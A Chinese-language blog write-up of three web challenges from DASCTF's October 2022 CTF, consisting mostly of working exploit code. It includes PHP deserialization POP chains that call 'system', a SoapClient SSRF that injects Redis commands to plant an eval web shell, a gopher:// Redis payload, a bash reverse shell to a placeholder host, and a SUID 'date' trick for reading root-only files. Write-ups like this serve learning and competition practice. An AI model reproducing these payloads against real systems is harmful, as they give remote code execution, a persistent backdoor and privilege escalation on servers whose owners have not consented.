---
title: "DASCTF 2022 十月赛 Web 部分 Writeup"
date: 2022-10-24T15:02:34+08:00
lastmod: 2022-10-24T15:02:34+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

被师傅们带飞了, 混了个第三名

BlogSystem 还没搞清楚利用点是啥, 等官方 wp 出来后学习一下

<!--more-->

## EasyPOP

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: " . $this->time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __sleep()
    {
        $this->hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this->key;
        $name();
    }


    public function __destruct()
    {
        if ($this->password == $this->name) {

            echo $this->hint;
        } else if ($this->name = "jay") {
            secret_code::secret();
        } else {
            echo "This is our code";
        }
    }


    public function getPassword()
    {
        return $this->password;
    }

    public function setPassword($password): void
    {
        $this->password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once "hint.php";
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }

    private function show()
    {
        return $this->code->secret;
    }
}


if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a->setPassword(md5(mt_rand()));
} else {
    $a = new show("Ctfer");
    echo $a->show();
}
```

题目环境是 php 7.4, 图省事直接把所有属性的类型都改成 public

起点是 sorry 类的 `__destruct()`, 由 `echo $this->hint` 调用到 show 类的 `__toString()` 方法, 然后通过执行 `$this->ctf->show()` 跳转 secret_code 类的 `__call()` , 进而到 `show()` 方法, 在 `show()` 方法中访问不存在的属性, 跳转到 sorry 类的 `__get()`, 最后通过 `$name()` 跳到 fine 类的 `__invoke()`

pop 链构造如下

```php
<?php

class fine
{
    public $cmd;
    public $content;
}

class show
{
    public $ctf;
    public $time;
}

class sorry
{
    public $name;
    public $password;
    public $hint;
    public $key;
}

class secret_code
{
    public $code;
}

$e = new fine();
$e->cmd = 'system';
$e->content = 'cat /flag';

$d = new sorry();
$d->key = $e;

$c = new secret_code();
$c->code = $d;

$b = new Show();
$b->ctf = $c;

$a = new sorry();
$a->name = '123';
$a->password = '123';
$a->hint = $b;

echo serialize($a);
```

最后改一下数字绕过 `__wakeup`

```
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231752647.png)

## hade_waibo

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231753442.png)

cancan need 有任意文件读取

```
http://745b93ee-b378-4803-b84e-52f9e7b78d2a.node4.buuoj.cn:81/file.php?m=show&filename=file.php
```

file.php

```php
............
<?php
error_reporting(0);
session_start();
include 'class.php';

if($_SESSION['isLogin'] !== true){
	die("<script>alert('号登一下谢谢。');location.href='index.php'</script>");
}
$form = '
<form action="file.php?m=upload" method="post" enctype="multipart/form-data" >
    <input type="file" name="file">
    <button class="mini ui button" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
  提交
</font></font></button>
</form>';



$file = new file();
switch ($_GET['m']) {

	case 'upload':
		if(empty($_FILES)){die($form);}

		$type = end(explode(".", $_FILES['file']['name']));
		if ($file->check($type)) {
			die($file->upload($type));
		}else{
			die('你食不食油饼🤬');
		}
		break;

	case 'show':
		die($file->show($_GET['filename']));
		break;

	case 'rm':
		$file->rmfile();
		die("全删干净了捏😋");
		break;

	case 'logout':
		session_destroy();
		die("<script>alert('已退出登录');location.href='index.php'</script>");
		break;

	default:
		echo '<h2>Halo! '.$_SESSION['username'].'</h2>';
		break;
}
?>
............
```

class.php

```php
<?php
class User
{
    public $username;
    public function __construct($username){
        $this->username = $username;
        $_SESSION['isLogin'] = True;
        $_SESSION['username'] = $username;
    }
    public function __wakeup(){
        $cklen = strlen($_SESSION["username"]);
        if ($cklen != 0 and $cklen <= 6) {
            $this->username = $_SESSION["username"];
        }
    }
    public function __destruct(){
        if ($this->username == '') {
            session_destroy();
        }
    }
}

class File
{
    #更新黑名单为白名单，更加的安全
    public $white = array("jpg","png");

    public function show($filename){
        echo '<div class="ui action input"><input type="text" id="filename" placeholder="Search..."><button class="ui button" onclick="window.location.href=\'file.php?m=show&filename=\'+document.getElementById(\'filename\').value">Search</button></div><p>';
        if(empty($filename)){die();}
        return '<img src="data:image/png;base64,'.base64_encode(file_get_contents($filename)).'" />';
    }
    public function upload($type){
        $filename = "dasctf".md5(time().$_FILES["file"]["name"]).".$type";
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
        return "Upload success! Path: upload/" . $filename;
    }
    public function rmfile(){
        system('rm -rf /var/www/html/upload/*');
    }
    public function check($type){
        if (!in_array($type,$this->white)){
            return false;
        }
        return true;
    }

}

#更新了一个恶意又有趣的Test类
class Test
{
    public $value;

    public function __destruct(){
        chdir('./upload');
        $this->backdoor();
    }
    public function __wakeup(){
        $this->value = "Don't make dream.Wake up plz!";
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, "Hack by $file !");
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this->value)){
            $this->value = 'nono~';
        }
        system($this->value);
    }

}
```

Test 类可以利用, 第一时间想的是 phar 反序列化

可以用 `.` 执行命令来绕过正则

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231758660.png)

思路就是先上传 phar 文件, 然后上传一个 jpg, 其内容包含要执行的命令

注意 jpg 的名称要在 phar 的前面, 例如 phar 的名称是 `dasctfe4.jpg`, 包含命令的 jpg 名称必须是 `dasctfc2.jpg` 或者 `dasctf01.jpg` (ascii 码较小)

不过试的时候发现绕过 wakeup 好像不太行...

然后想起来做 EasyLove 题的时候根目录下有个 start.sh 部署脚本, 结合题目的描述 `tips:flag在/目录下的一个文件里`, 索性直接读取 start.sh 看看

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231801987.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231803463.png)

读取 /ghjsdk_F149_H3re_asdasfc 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231804991.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231804073.png)

## EasyLove

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;

    public function __construct($wllm,$arsenetang,$l61q4cheng,$love){
        $this->wllm = $wllm;
        $this->arsenetang = $arsenetang;
        $this->l61q4cheng = $l61q4cheng;
        $this->love = $love;
    }
    public function newnewnew(){
        $this->love = new $this->wllm($this->arsenetang,$this->l61q4cheng);
    }

    public function flag(){
        $this->love->getflag();
    }

    public function __destruct(){
        $this->newnewnew();
        $this->flag();
    }
}
class hint{
    public $hint;
    public function __destruct(){
        echo file_get_contents($this-> hint.'hint.php');
    }
}
$hello = $_GET['hello'];
$world = unserialize($hello);
```

根据题目描述的 redis, 猜测是通过 ssrf + redis 来 getshell

`$this->love = new $this->wllm($this->arsenetang,$this->l61q4cheng);` 这句很明显是要通过某个类来执行 ssrf

众所周知 redis 的协议很宽松, 支持用 http 来发包, 而 php 原生的 SoapClient 类可以发送 http

payload 如下

```php
<?php

class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
}

$a = new swpu();
$a->wllm = 'SoapClient';
$a->arsenetang = null;
$target = 'http://127.0.0.1:6379/';
$poc = "flushall\r\nconfig set dir /var/www/html/\r\nconfig set dbfilename shell.php\r\nset xzxzxz '<?=eval(\$_REQUEST[1])?>'\r\nsave";

$a->l61q4cheng = array('location'=>$target, 'uri'=>"hello\r\n".$poc."\r\nhello");
echo urlencode(serialize($a));
```

试的时候一直卡住 (正常现象), 访问 shell.php 也显示 404

于是猜测 redis 可能有认证, 看了下题目有 hint 类, 通过 `file_get_contents()` 来获得 hint.php 的内容

直接反序列化 hint 无回显, 结果想试试 `file_get_contents()` + gopher 的时候阴差阳错地读到了 hint.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231829355.png)

```php
<?php

class hint{
    public $hint;
}
$a = new hint();
$a->hint = 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A';
echo serialize($a);
```

```
http://0021bfdb-5d2b-42ff-9505-49d23c4aa0e2.node4.buuoj.cn:81/?hello=O:4:"hint":1:{s:4:"hint";s:404:"gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A";}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231830188.png)

猜测 20220311 就是 redis 的密码

于是最终 payload 如下

```php
<?php

class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
}

$a = new swpu();
$a->wllm = 'SoapClient';
$a->arsenetang = null;
$target = 'http://127.0.0.1:6379/';
$poc = "auth 20220311\r\nflushall\r\nconfig set dir /var/www/html/\r\nconfig set dbfilename shell.php\r\nset xzxzxz '<?=eval(\$_REQUEST[1])?>'\r\nsave";

$a->l61q4cheng = array('location'=>$target, 'uri'=>"hello\r\n".$poc."\r\nhello");
echo urlencode(serialize($a));
```

```
O%3A4%3A%22swpu%22%3A4%3A%7Bs%3A4%3A%22wllm%22%3Bs%3A10%3A%22SoapClient%22%3Bs%3A10%3A%22arsenetang%22%3BN%3Bs%3A10%3A%22l61q4cheng%22%3Ba%3A2%3A%7Bs%3A8%3A%22location%22%3Bs%3A22%3A%22http%3A%2F%2F127.0.0.1%3A6379%2F%22%3Bs%3A3%3A%22uri%22%3Bs%3A145%3A%22hello%0D%0Aauth+20220311%0D%0Aflushall%0D%0Aconfig+set+dir+%2Fvar%2Fwww%2Fhtml%2F%0D%0Aconfig+set+dbfilename+shell.php%0D%0Aset+xzxzxz+%27%3C%3F%3Deval%28%24_REQUEST%5B1%5D%29%3F%3E%27%0D%0Asave%0D%0Ahello%22%3B%7Ds%3A4%3A%22love%22%3BN%3B%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231832077.png)

访问 shell.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231833180.png)

蚁剑连接, 发现 flag 打不开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231833251.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231834534.png)

root 权限, 估计是要提权

先用 bash 反弹 shell, 直接输入会有点问题, 解决方法是先在 bash.sh 里写入反弹命令, 然后通过 `bash bash.sh` 来执行

```bash
bash -i >& /dev/tcp/xxxx/yyyy 0>&1
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231836286.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231837760.png)

查找带 SUID 的文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231839463.png)

发现有 date, 于是直接用 date 来读取 flag

```bash
date -f /hereisflag/flllll111aaagg
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231839756.png)

## 补充

hade_waibo 听其它师傅说利用的是最近出来的 issue 来绕过 \_\_wakeup

[https://github.com/php/php-src/issues/9618](https://github.com/php/php-src/issues/9618)

这样的话目前绕过 \_\_wakeup 的方法就不止 CVE-2016-7124 了, 加上 p 牛知识星球里的方法, 至少有四五种

EasyLove 那步能出来 hint 的原因是 payload 中有 `%0a`, 不过具体原理是啥还不太清楚...

